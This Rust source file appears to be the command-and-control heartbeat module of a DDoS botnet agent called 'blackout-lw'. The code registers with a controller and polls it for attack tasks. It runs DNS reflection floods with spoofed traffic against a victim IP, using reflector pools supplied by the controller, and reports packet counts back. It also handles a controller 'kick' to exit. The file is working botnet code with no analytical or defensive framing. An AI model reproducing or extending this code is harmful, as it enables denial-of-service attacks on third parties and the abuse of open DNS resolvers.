// 心跳主循环：注册 → 轮询任务 → 执行 → 上报 → 踢出自毁。
// 心跳即任务轮询：一次 POST 完成在线证明 + 任务领取 + 踢出检查。

use crate::attack::{run_dns_reflection, Stats};
use crate::config::Config;
use crate::http;
use crate::reflector;
use crate::spoof::{fmt_ip, parse_ipv4};
use std::time::Duration;

#[derive(Debug)]
pub struct HError(pub String);

impl std::fmt::Display for HError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.0)
    }
}

impl From<http::HttpError> for HError {
    fn from(e: http::HttpError) -> Self {
        HError(e.0)
    }
}

// 任务 JSON（与 Controller /api/lw/heartbeat 响应对齐）
#[derive(serde::Deserialize, Default)]
struct TaskMsg {
    task_id: String,
    target: String,
    method: String,
    duration: u64,
    threads: u32,
    #[serde(default)]
    targets: Vec<String>,
}

#[derive(serde::Deserialize)]
struct HeartbeatResp {
    #[serde(default)]
    task: Option<TaskMsg>,
    #[serde(default)]
    kick: bool,
}

#[derive(serde::Serialize)]
struct HeartbeatReq<'a> {
    token: &'a str,
    node_id: &'a str,
}

pub fn run(cfg: &Config) -> Result<(), HError> {
    let node_id = register(cfg)?;
    eprintln!("blackout-lw: registered as {node_id}");

    let stats = std::sync::Arc::new(Stats::default());
    let mut last_report = std::time::Instant::now() - Duration::from_secs(60);

    loop {
        // 心跳（= 任务轮询）
        let hb_json = serde_json::to_string(&HeartbeatReq { token: &cfg.token, node_id: &node_id })
            .map_err(|e| HError(e.to_string()))?;
        let resp = http::post_json(
            &cfg.controller,
            "/api/lw/heartbeat",
            &cfg.token,
            &hb_json,
            Duration::from_secs(10),
        )?;

        if resp.status == 401 || resp.status == 403 {
            return Err(HError("controller rejected token (401/403)".into()));
        }
        if resp.status != 200 {
            // 控制器不可用：退避重试
            eprintln!("blackout-lw: heartbeat http {}", resp.status);
            std::thread::sleep(Duration::from_secs(5));
            continue;
        }

        let hb: HeartbeatResp = serde_json::from_str(&resp.body)
            .map_err(|e| HError(format!("heartbeat parse: {e} body={}", resp.body)))?;

        if hb.kick {
            eprintln!("blackout-lw: KICKED by controller, exiting (self-remove optional)");
            return Ok(());
        }

        if let Some(task) = hb.task {
            run_task(cfg, &node_id, &task, &stats)?;
        }

        // 统计上报（3s 周期合并到下一次心跳前）
        if last_report.elapsed() >= Duration::from_secs(3) {
            let _ = report(cfg, &node_id, &stats);
            last_report = std::time::Instant::now();
        }

        std::thread::sleep(Duration::from_secs(cfg.heartbeat_secs));
    }
}

fn register(cfg: &Config) -> Result<String, HError> {
    let body = format!(
        r#"{{"token":"{}","platform":"{}","arch":"{}"}}"#,
        cfg.token,
        std::env::consts::OS,
        std::env::consts::ARCH
    );
    let resp = http::post_json(&cfg.controller, "/api/lw/register", &cfg.token, &body, Duration::from_secs(10))?;
    if resp.status != 200 {
        return Err(HError(format!("register http {}", resp.status)));
    }
    #[derive(serde::Deserialize)]
    struct RegResp {
        #[serde(default)]
        node_id: String,
    }
    let r: RegResp = serde_json::from_str(&resp.body).map_err(|e| HError(format!("register parse: {e}")))?;
    if r.node_id.is_empty() {
        return Err(HError("register: empty node_id".into()));
    }
    Ok(r.node_id)
}

fn run_task(cfg: &Config, node_id: &str, task: &TaskMsg, stats: &std::sync::Arc<Stats>) -> Result<(), HError> {
    if task.method != "dns_reflector" {
        eprintln!("blackout-lw: task {} method {} not supported by lw, skipping", task.task_id, task.method);
        return Ok(());
    }
    let victim_ip = match parse_ipv4(task.target.split(':').next().unwrap_or("")) {
        Some(ip) => ip,
        None => {
            eprintln!("blackout-lw: task {} bad victim target {}", task.task_id, task.target);
            return Ok(());
        }
    };
    // 拉池（优先用任务内嵌 targets，否则拉全池）
    let reflectors = if !task.targets.is_empty() {
        task.targets.iter().filter_map(|s| reflector::parse_entry(s)).collect()
    } else {
        reflector::fetch_dns_pool(&cfg.controller, &cfg.token, 2000)?
    };
    if reflectors.is_empty() {
        eprintln!("blackout-lw: task {} no reflectors, skipping", task.task_id);
        return Ok(());
    }

    let spec = crate::attack::TaskSpec {
        task_id: task.task_id.clone(),
        victim_ip,
        duration_secs: task.duration,
        threads: task.threads,
        reflectors,
        max_pps: cfg.max_pps,
    };
    eprintln!(
        "blackout-lw: task {} dns_reflector -> {} ({}) threads={} dur={}s",
        task.task_id, task.target, fmt_ip(victim_ip), spec.threads, spec.duration_secs
    );
    run_dns_reflection(&spec, std::sync::Arc::clone(stats));
    report(cfg, node_id, stats)?;
    eprintln!("blackout-lw: task {} done (pkts={})", task.task_id, stats.packets.load(std::sync::atomic::Ordering::Relaxed));
    Ok(())
}

fn report(cfg: &Config, node_id: &str, stats: &Stats) -> Result<(), HError> {    use std::sync::atomic::Ordering;
    let body = format!(
        r#"{{"token":"{}","node_id":"{}","packets":{},"bytes":{},"errors":{},"pps":{}}}"#,
        cfg.token,
        node_id,
        stats.packets.load(Ordering::Relaxed),
        stats.bytes.load(Ordering::Relaxed),
        stats.errors.load(Ordering::Relaxed),
        stats.pps.load(Ordering::Relaxed),
    );
    let resp = http::post_json(&cfg.controller, "/api/lw/report", &cfg.token, &body, Duration::from_secs(10))?;
    if resp.status != 200 {
        return Err(HError(format!("report http {}", resp.status)));
    }
    Ok(())
}
